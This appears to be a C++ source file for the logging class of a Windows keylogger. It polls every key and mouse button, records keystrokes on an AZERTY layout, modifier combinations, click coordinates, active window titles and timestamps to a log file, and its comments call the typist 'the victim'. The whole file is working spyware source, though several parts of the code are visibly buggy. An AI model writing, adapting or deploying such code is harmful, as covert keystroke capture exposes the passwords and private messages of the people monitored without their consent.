#include "stdafx.h"
#include <Windows.h>
#include "Logs.h"

Logs::Logs(std::string &keyFileName)
	: _keyFileName(keyFileName),
	_lastActiveWindow(std::string()), _pressedKeys(std::string())
{
	SYSTEMTIME currTime;

	GetSystemTime(&currTime);
	currTime.wMinute -= 1;
	_lastPrintedTime = currTime;
}

Logs::~Logs()
{
}

const std::string	&Logs::getKeyFileName(void) const
{
	return (_keyFileName);
}

/*  Func waitForInput

Receive a (char)key_stroke : The key we want to write
@return void


This is the main function of the Logs class as it checks
if a key is pressed while the program is on execution
*/
void	Logs::printCurrTime(void)
{
	SYSTEMTIME currTime;

	GetSystemTime(&currTime);
	if (_lastPrintedTime.wMinute != currTime.wMinute)
	{
		_keyFile << "\n\n######################\n" 
				<< "# " << currTime.wDay << '/' << currTime.wMonth << '/' << currTime.wYear <<
				" - " << currTime.wHour << 'h' << currTime.wMinute << " #\n" <<
				"######################\n";
		_lastPrintedTime = currTime;
		_lastActiveWindow = std::string();
	}
}

void	Logs::waitForInput(void)
{
	int i;

	while (42)
	{
		for (i = MIN_KEY_SIZE; i <= MAX_KEY_SIZE; i++)
		{
			if (IS_MOUSE_KEY(i))
				if (GetKeyState(i) & 0x80)
					writeMouseLog(i);
			if ((GetAsyncKeyState(i) & 0x0001))
				writeLog(i);
		}
	}
	system("PAUSE");
}

bool	Logs::writeMouseLog(int sKey)
{
	POINT		t1;

	if (!openLog(_keyFile, _keyFileName))
		exit(EXIT_FAILURE);

	printCurrTime();

	if (getActiveWindowTitle(false) != std::string())
	{
		_keyFile << "\n{{ " + getActiveWindowTitle(true) + " (PID: ";
		_keyFile << GetCurrentProcessId();
		_keyFile << ") }}:\n";
	}

	GetCursorPos(&t1);
	switch (sKey)
	{
		case VK_LBUTTON:
			_keyFile << "\n[LEFT CLICK: X{" << t1.x << "} Y{" << t1.y << "}]\n";
			break;
		case VK_RBUTTON:
			_keyFile << "\n[RIGHT CLICK: X{" << t1.x << "} Y{" << t1.y << "}]\n";
			break;
	}

	return (false);
	_keyFile.close();
}

void			Logs::checkCombinedKeys(std::map<std::string, std::pair<int, bool>> &combinedKeys, int vkType)
{
	int			i = 0;

	for (std::map<std::string, std::pair<int, bool>>::iterator it = combinedKeys.begin(); it != combinedKeys.end(); ++it)
	{
		std::pair<int, bool> &val = combinedKeys[it->first];
		if (!val.second && val.first != vkType && GetKeyState(val.first) & 0x80)
		{
			_pressedKeys += " + " + it->first;
			val.second = true;
		}
	}
}

bool		Logs::checkSpecialChar(int sKey)
{
	int			i = 0;
	const int	totalSP = 74;
	int			allowedKeys[totalSP] = {	VK_TAB, VK_DELETE, VK_INSERT, VK_HOME,
											VK_F1, VK_F2, VK_F3, VK_F4, VK_F5, VK_F6,
											VK_F7, VK_F8, VK_F9, VK_F10, VK_F11, VK_F12,
											VK_END, VK_PRIOR, VK_NEXT, VK_SPACE, VK_RETURN,
											VK_LEFT, VK_UP, VK_RIGHT, VK_DOWN,
											VK_OEM_COMMA, VK_OEM_PERIOD, VK_OEM_2, VK_OEM_8,
											VK_OEM_PLUS, VK_OEM_1, VK_OEM_3, VK_OEM_5, VK_OEM_6,
											VK_OEM_102, VK_OEM_4, VK_ESCAPE, VK_BACK,
											'0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
											'A', 'Z', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P',
											'Q', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'M',
											'W', 'X', 'C', 'V', 'B', 'N' };

	std::string allowedKeysM[totalSP] = {	"[TAB]", "[SUPPR]", "[INSER]", "[WINDOWS BUTTON]",
											"[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]",
											"[F7]", "[F8]", "[F9]", "[F10]", "[F11]", "[F12]",
											"[END]", "[PAGE UP]", "[PAGE DOWN]", " ", "\n",
											"[LEFT]", "[UP]", "[RIGHT", "[DOWN]",
											",", ";", ":", "!",
											"=", "$", "ù", "*", "^",
											"<", ")", "[ESCAPE]", "[BACK]",
											"à", "&", "é", "\"", "'", "(", "-", "è", "_", "ç",
											"a", "z", "e", "r", "t", "y", "u", "i", "o", "p",
											"q", "s", "d", "f", "g", "h", "j", "k", "l", "m",
											"w", "x", "c", "v", "b", "n" };
	while (i < totalSP)
	{
		if (allowedKeys[i] == sKey)
		{
			if (_pressedKeys.length() > 0)
				_keyFile << _pressedKeys + " + ";
			_keyFile << allowedKeysM[i];
			if (_pressedKeys.length() > 0)
				_keyFile << ']';
			return (true);
		}
		++i;
	}
	return (false);
}

bool			Logs::checkPressedShift(void)
{
	int			i;
	char		tmp;
	int			it;
	const int	totalSP = 13;
	int			allowedKeys[totalSP] = {	VK_OEM_PLUS, VK_SPACE, VK_OEM_2, VK_OEM_COMMA, VK_OEM_PERIOD, VK_SELECT,
											VK_OEM_1, VK_OEM_3, VK_OEM_5, VK_OEM_6, VK_OEM_102, VK_OEM_4 };
	std::string allowedKeysM[totalSP] = {	"+", " ", "/", "?", ".", "§", ")",
											"£", "%", "µ", "¨", ">", "°" };

	it = 0;
	while (GetKeyState(VK_SHIFT) & 0x80)
	{
		i = MIN_KEY_SIZE;
		while (i <= MAX_KEY_SIZE)
		{
			if (GetAsyncKeyState(i) & 0x0001)
			{
				if (i >= '0' && i <= 'Z')
				{
					tmp = i;
					_keyFile << tmp;
				}
				else
				{
					while (it < totalSP)
					{
						if (allowedKeys[it] == i)
							_keyFile << allowedKeysM[it];
						++it;
					}
					it = 0;
				}
			}
			++i;
		}
	}
	return (false);
}

bool			Logs::checkVerySpecialChar(int sKey)
{
	int			i = 0;
	const int	totalSP = 12;
	int			allowedKeys[totalSP] = { '2', '3', '4', '5', '6', '7', '8', '9', '0', VK_OEM_1, VK_OEM_PLUS, VK_OEM_4 };
	std::string allowedKeysM[totalSP] = { "~", "#", "{", "[", "|", "`", "\\", "^", "@", "¤", "}", ")" };

	while (i < totalSP)
	{
		if (allowedKeys[i] == sKey)
		{
			_keyFile << allowedKeysM[i];
			return (true);
		}
		++i;
	}
	return (false);

}

bool	Logs::checkPressedAltGr(void)
{
	if ((GetKeyState(VK_CONTROL) & 0x80) && (GetKeyState(VK_MENU) & 0x80))
		return (true);
	return (false);
}

bool							Logs::checkPressedKey(char key_stroke, int vkType, char *name)
{
	bool						firstTime;
	int							i;
	std::map<std::string, std::pair<int, bool>>	combinedKeys;

	firstTime = true;
	combinedKeys["SHIFT"] = (key_stroke == VK_SHIFT) ? std::make_pair(VK_SHIFT, true) : std::make_pair(VK_SHIFT, false);
	combinedKeys["ALT"] = (key_stroke == VK_MENU) ? std::make_pair(VK_MENU, true) : std::make_pair(VK_MENU, false);
	combinedKeys["CTRL"] = (key_stroke == VK_CONTROL) ? std::make_pair(VK_CONTROL, true) : std::make_pair(VK_CONTROL, false);
	while (GetKeyState(vkType) & 0x80)
	{
		i = MIN_KEY_SIZE;
		while (i <= MAX_KEY_SIZE)
		{
			if (GetAsyncKeyState(i) & 0x0001)
			{
				if (checkPressedAltGr() && i >= '0')
				{
					if (checkVerySpecialChar(i))
						_pressedKeys.clear();
				}
				if (!checkVerySpecialChar(i))
				{
					if (firstTime)
					{
						_pressedKeys = "[" + std::string(name);
						firstTime = false;
					}
					checkCombinedKeys(combinedKeys, vkType);
					checkSpecialChar(i);
				}
			}
			++i;
		}
	}
	if (firstTime)
		_keyFile << '[' + name + ']';
	return (true);
}

/*  Func writeLog

Receive a (char)key_stroke : The key used by the victim
@return void
*/
void	Logs::writeLog(int key_stroke)
{
	if (!openLog(_keyFile, _keyFileName))
		exit(EXIT_FAILURE);

	printCurrTime();

	if (getActiveWindowTitle(false) != std::string())
		_keyFile << "\n{{ " + getActiveWindowTitle(true) + " }}:\n";

	switch (key_stroke)
	{
		case VK_CAPITAL:
			if (GetKeyState(VK_CAPITAL) & 0x0001)
				_keyFile << "[CAPSLOCK ON]";
			else
				_keyFile << "[CAPSLOCK OFF]";
			break;
		case VK_CONTROL:
			checkPressedKey(key_stroke, VK_CONTROL, "CTRL");
			break;
		case VK_MENU:
			checkPressedKey(key_stroke, VK_MENU, "ALT");
			break;
		case VK_SHIFT:
			checkPressedShift();
			break;
		default:
			_pressedKeys.clear();
			checkSpecialChar(key_stroke);
			break;
	}
	_keyFile.close();
}

/*  Func deleteLog

Receive a (int)nbChar : Number of char to delete
@return void
*/
void	Logs::deleteLog(int nbChar)
{

}

/*  Func openLog

Receive a (string)fileName : Number of char to delete
@return a pointer (FILE) to the opended file or NULL if failed
*/
bool	Logs::openLog(std::ofstream &filePtr, std::string &fileName) const
{
	filePtr.open(fileName, std::ios_base::app);
	return (true);
}

const std::string			Logs::getActiveWindowTitle(bool assign)
{
	wchar_t			lp[256];
	std::size_t		pos;
	std::wstring	ws;
	std::string		activeW;

	GetWindowText(GetForegroundWindow(), lp, sizeof(lp));
	ws = lp;
	std::string tmp(ws.begin(), ws.end());
	pos = tmp.find_last_of("\\");
	activeW = tmp.substr(pos + 1);

	if (activeW != _lastActiveWindow)
	{
		if (assign)
			_lastActiveWindow = activeW;
		return (activeW);
	}
	return (std::string());
}
